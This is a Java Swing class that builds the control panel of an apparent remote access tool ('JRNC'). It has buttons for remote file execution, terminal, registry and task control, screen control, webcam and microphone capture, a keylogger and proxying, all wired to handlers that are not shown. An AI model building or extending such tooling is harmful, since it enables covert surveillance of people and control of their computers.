package javanet.client;

import java.awt.GridLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.net.Socket;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;

/**
 *
 * @author Jackson McClintock
 */
public class Control {
    
    int screenx = Toolkit.getDefaultToolkit().getScreenSize().width;
    int screeny = Toolkit.getDefaultToolkit().getScreenSize().height;
    Socket socket;
    ClientUtils utils;
    
    public Control(Client client, JButton connect_button, Socket socket){
        this.socket = socket;
        utils = new ClientUtils(client, connect_button, socket);
        JFrame control_frame = new JFrame("Control: " + socket.getInetAddress().getHostAddress());
        control_frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        control_frame.setLayout(new GridLayout(4,3));
        JButton execute_bt = new JButton("Execute File");
        JButton create_file_bt = new JButton("Create File");
        JButton file_manager_bt = new JButton("File Manager");
        JButton regedit_bt = new JButton("Registry Editor");
        JButton task_manager_bt = new JButton("Task Manager");
        JButton screen_bt = new JButton("Screen Control");
        JButton terminal_bt = new JButton("Terminal");
        JButton webcam_bt = new JButton("Webcam Control");
        JButton mic_bt = new JButton("Microphone Control");
        JButton keylogger_bt = new JButton("Keylogger");
        JButton proxy_bt = new JButton("Proxy control");
        control_frame.add(execute_bt);
        control_frame.add(create_file_bt);
        control_frame.add(file_manager_bt);
        control_frame.add(regedit_bt);
        control_frame.add(task_manager_bt);
        control_frame.add(screen_bt);
        control_frame.add(terminal_bt);
        control_frame.add(webcam_bt);
        control_frame.add(mic_bt);
        control_frame.add(keylogger_bt);
        control_frame.add(proxy_bt);
        control_frame.add(new JLabel("More with JRNC", JLabel.CENTER));
        control_frame.setBounds(screenx / 3, screeny / 3, 700, 250);
        control_frame.setVisible(true);
        execute_bt.addActionListener((ActionEvent ae) -> {
            utils.execute.openFrame(new String[]{});
        });
        create_file_bt.addActionListener((ActionEvent ae) -> {
            utils.create_file.openFrame(new String[]{"", "Create", ""});
        });
        file_manager_bt.addActionListener((ActionEvent ae) -> {
            utils.file_manager.openFrame(new String[]{});
        });
        regedit_bt.addActionListener((ActionEvent ae) -> {
            utils.regedit.openFrame(new String[]{});
        });
        task_manager_bt.addActionListener((ActionEvent ae) -> {
            utils.task_manager.openFrame(new String[]{});
        });
        screen_bt.addActionListener((ActionEvent ae) -> {
            utils.screen.openFrame(new String[]{});
        });
        terminal_bt.addActionListener((ActionEvent ae) -> {
            utils.terminal.openFrame(new String[]{""});
        });
        webcam_bt.addActionListener((ActionEvent ae) -> {
            utils.webcam.openFrame(new String[]{});
        });
        mic_bt.addActionListener((ActionEvent ae) -> {
            utils.mic.openFrame(new String[]{});
        });
        keylogger_bt.addActionListener((ActionEvent ae) -> {
            utils.keylogger.openFrame(new String[]{});
        });
        proxy_bt.addActionListener((ActionEvent ae) -> {
            utils.proxy.openFrame(new String[]{});
        });
        new Thread(){
            @Override
            public void run(){
                utils.resultListener();
            }
        }.start();
    }
    
}
